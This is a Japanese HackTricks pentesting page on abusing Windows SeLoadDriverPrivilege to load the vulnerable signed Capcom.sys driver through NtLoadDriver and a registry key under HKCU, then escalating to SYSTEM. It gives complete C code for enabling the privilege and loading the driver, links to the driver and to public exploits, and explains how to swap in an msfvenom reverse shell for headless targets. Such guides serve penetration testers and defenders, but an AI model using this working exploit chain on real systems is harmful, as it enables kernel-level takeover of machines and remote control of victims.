# SeLoadDriverPrivilege の悪用

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricks で会社を宣伝**したいですか？または、**最新バージョンの PEASS を入手したり、HackTricks を PDF でダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式の PEASS & HackTricks スワッグ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord グループ**](https://discord.gg/hRep4RUj7f)または[**telegram グループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **ハッキングのトリックを共有するには、[hacktricks リポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloud リポジトリ](https://github.com/carlospolop/hacktricks-cloud)**に PR を提出してください。

</details>

## SeLoadDriverPrivilege <a href="#seloaddriverprivilege" id="seloaddriverprivilege"></a>

どのユーザーにも割り当てるのは非常に危険な特権です。これにより、ユーザーはカーネルドライバをロードし、カーネル特権でコードを実行することができます（`NT\System`）。以下のスクリーンショットでは、`offense\spotless` ユーザーがこの特権を持っていることがわかります：

![](../../../.gitbook/assets/a8.png)

`Whoami /priv` コマンドでは、この特権がデフォルトで無効になっていることがわかります：

![](../../../.gitbook/assets/a9.png)

しかし、以下のコードを使用すると、この特権を簡単に有効にすることができます：

{% code title="privileges.cpp" %}
```c
#include "stdafx.h"
#include <windows.h>
#include <stdio.h>

int main()
{
TOKEN_PRIVILEGES tp;
LUID luid;
bool bEnablePrivilege(true);
HANDLE hToken(NULL);
OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);

if (!LookupPrivilegeValue(
NULL,            // lookup privilege on local system
L"SeLoadDriverPrivilege",   // privilege to lookup
&luid))        // receives LUID of privilege
{
printf("LookupPrivilegeValue error: %un", GetLastError());
return FALSE;
}
tp.PrivilegeCount = 1;
tp.Privileges[0].Luid = luid;

if (bEnablePrivilege) {
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
}

// Enable the privilege or disable all privileges.
if (!AdjustTokenPrivileges(
hToken,
FALSE,
&tp,
sizeof(TOKEN_PRIVILEGES),
(PTOKEN_PRIVILEGES)NULL,
(PDWORD)NULL))
{
printf("AdjustTokenPrivileges error: %x", GetLastError());
return FALSE;
}

system("cmd");
return 0;
}
```
{% endcode %}

上記をコンパイルして実行すると、特権 `SeLoadDriverPrivilege` が有効になります：

![](../../../.gitbook/assets/a10.png)

### Capcom.sys ドライバの脆弱性 <a href="#capcom-sys-driver-exploit" id="capcom-sys-driver-exploit"></a>

`SeLoadDriverPrivilege` が危険であることをさらに証明するために、特権を昇格させるためにそれを悪用してみましょう。

**NTLoadDriver** を使用して新しいドライバをロードすることができます：
```cpp
NTSTATUS NTLoadDriver(
_In_ PUNICODE_STRING DriverServiceName
);
```
デフォルトでは、ドライバーサービス名は`\Registry\Machine\System\CurrentControlSet\Services\`の下にあるはずです。

しかし、**ドキュメント**によると、**HKEY_CURRENT_USER**の下のパスも使用できるため、システム上で任意のドライバーをロードするためにそこでレジストリを変更することもできます。
新しいレジストリで定義する必要がある関連するパラメータは次のとおりです。

* **ImagePath:** ドライバーパスを指定するREG_EXPAND_SZ型の値。このコンテキストでは、パスは特権のないユーザーによって変更許可が与えられたディレクトリである必要があります。
* **Type**: サービスのタイプを示すREG_WORD型の値。私たちの目的のために、値はSERVICE_KERNEL_DRIVER（0x00000001）として定義されるべきです。

したがって、**`\Registry\User\<User-SID>\System\CurrentControlSet\MyService`**に新しいレジストリを作成し、**ImagePath**にドライバーへのパス、**Type**に値1を指定し、それらの値をエクスプロイトで使用することができます（ユーザーSIDは次の方法で取得できます：`Get-ADUser -Identity 'USERNAME' | select SID`または`(New-Object System.Security.Principal.NTAccount("USERNAME")).Translate([System.Security.Principal.SecurityIdentifier]).value`）。
```bash
PCWSTR pPathSource = L"C:\\experiments\\privileges\\Capcom.sys";
PCWSTR pPathSourceReg = L"\\Registry\\User\\<User-SID>\\System\\CurrentControlSet\\MyService";
```
最初の変数は、被害者のシステム上にある脆弱な**Capcom.sys**ドライバの場所を示す文字列変数を宣言しています。2番目の変数は、使用されるサービス名を示す文字列変数です（任意のサービス名を使用できます）。
注意：**ドライバはWindowsによって署名されている必要がある**ため、任意のドライバをロードすることはできません。しかし、**Capcom.sys**は**任意のコードを実行するために悪用でき、Windowsによって署名されています**。したがって、このドライバをロードして悪用することが目標です。

ドライバをロードする：
```c
#include "stdafx.h"
#include <windows.h>
#include <stdio.h>
#include <ntsecapi.h>
#include <stdlib.h>
#include <locale.h>
#include <iostream>
#include "stdafx.h"

NTSTATUS(NTAPI *NtLoadDriver)(IN PUNICODE_STRING DriverServiceName);
VOID(NTAPI *RtlInitUnicodeString)(PUNICODE_STRING DestinationString, PCWSTR SourceString);
NTSTATUS(NTAPI *NtUnloadDriver)(IN PUNICODE_STRING DriverServiceName);

int main()
{
TOKEN_PRIVILEGES tp;
LUID luid;
bool bEnablePrivilege(true);
HANDLE hToken(NULL);
OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);

if (!LookupPrivilegeValue(
NULL,            // lookup privilege on local system
L"SeLoadDriverPrivilege",   // privilege to lookup
&luid))        // receives LUID of privilege
{
printf("LookupPrivilegeValue error: %un", GetLastError());
return FALSE;
}
tp.PrivilegeCount = 1;
tp.Privileges[0].Luid = luid;

if (bEnablePrivilege) {
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
}

// Enable the privilege or disable all privileges.
if (!AdjustTokenPrivileges(
hToken,
FALSE,
&tp,
sizeof(TOKEN_PRIVILEGES),
(PTOKEN_PRIVILEGES)NULL,
(PDWORD)NULL))
{
printf("AdjustTokenPrivileges error: %x", GetLastError());
return FALSE;
}

//system("cmd");
// below code for loading drivers is taken from https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/RDI/dll/NtLoadDriver.h
std::cout << "[+] Set Registry Keys" << std::endl;
NTSTATUS st1;
UNICODE_STRING pPath;
UNICODE_STRING pPathReg;
PCWSTR pPathSource = L"C:\\experiments\\privileges\\Capcom.sys";
PCWSTR pPathSourceReg = L"\\Registry\\User\\<User-SID>\\System\\CurrentControlSet\\MyService";
const char NTDLL[] = { 0x6e, 0x74, 0x64, 0x6c, 0x6c, 0x2e, 0x64, 0x6c, 0x6c, 0x00 };
HMODULE hObsolete = GetModuleHandleA(NTDLL);
*(FARPROC *)&RtlInitUnicodeString = GetProcAddress(hObsolete, "RtlInitUnicodeString");
*(FARPROC *)&NtLoadDriver = GetProcAddress(hObsolete, "NtLoadDriver");
*(FARPROC *)&NtUnloadDriver = GetProcAddress(hObsolete, "NtUnloadDriver");

RtlInitUnicodeString(&pPath, pPathSource);
RtlInitUnicodeString(&pPathReg, pPathSourceReg);
st1 = NtLoadDriver(&pPathReg);
std::cout << "[+] value of st1: " << st1 << "\n";
if (st1 == ERROR_SUCCESS) {
std::cout << "[+] Driver Loaded as Kernel..\n";
std::cout << "[+] Press [ENTER] to unload driver\n";
}

getchar();
st1 = NtUnloadDriver(&pPathReg);
if (st1 == ERROR_SUCCESS) {
std::cout << "[+] Driver unloaded from Kernel..\n";
std::cout << "[+] Press [ENTER] to exit\n";
getchar();
}

return 0;
}
```
上記のコードがコンパイルされ、実行されると、悪意のある `Capcom.sys` ドライバが被害者のシステムにロードされることがわかります：

![](../../../.gitbook/assets/a11.png)

ダウンロード：[Capcom.sys - 10KB](https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LTyWsUdKa48PyMRyZ4I%2F-LTyZ9IkoofuWRxlNpUG%2FCapcom.sys?alt=media\&token=e4417fb3-f2fd-42ef-9000-d410bc6ceb54)

**今度はロードされたドライバを悪用して任意のコードを実行します。**

[https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom) と [https://github.com/zerosum0x0/puppetstrings](https://github.com/zerosum0x0/puppetstrings) からエクスプロイトをダウンロードし、システム上で実行して特権を `NT Authority\System` に昇格させることができます：

![](../../../.gitbook/assets/a12.png)

### GUI なし

ターゲットには **GUI アクセスがない** 場合、コンパイル前に **`ExploitCapcom.cpp`** コードを変更する必要があります。ここでは、292行を編集し、`C:\\Windows\\system32\\cmd.exe"` を、例えば `msfvenom` で作成した逆シェルバイナリ（例：`c:\ProgramData\revshell.exe`）に置き換えることができます。

コード：c
```c
// Launches a command shell process
static bool LaunchShell()
{
TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
PROCESS_INFORMATION ProcessInfo;
STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo,
&ProcessInfo))
{
return false;
}

CloseHandle(ProcessInfo.hThread);
CloseHandle(ProcessInfo.hProcess);
return true;
}
```
この例の`CommandLine`文字列は次のように変更されます：

コード：c
```c
TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");
```
私たちは、生成した`msfvenom`ペイロードに基づいてリスナーを設定し、`ExploitCapcom.exe`を実行すると、逆シェル接続が受信されることを期待しています。逆シェル接続が何らかの理由でブロックされている場合は、バインドシェルまたはexec/addユーザーペイロードを試すことができます。

### 自動

[https://github.com/TarlogicSecurity/EoPLoadDriver/](https://github.com/TarlogicSecurity/EoPLoadDriver/)を使用して、特権を**自動的に有効化**し、HKEY\_CURRENT\_USERの下に**レジストリキー**を**作成**し、作成するレジストリキーとドライバのパスを指定してNTLoadDriverを実行することができます。

![](<../../../.gitbook/assets/image (289).png>)

その後、特権昇格のために**Capcom.sys**のエクスプロイトをダウンロードして使用する必要があります。

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ HackTricksであなたの会社を宣伝したいですか？または、PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロードしたりしたいですか？ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**をフォロー**してください。
* **ハッキングのトリックを共有するには、[hacktricks repo](https://github.com/carlospolop/hacktricks)と[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。

</details>
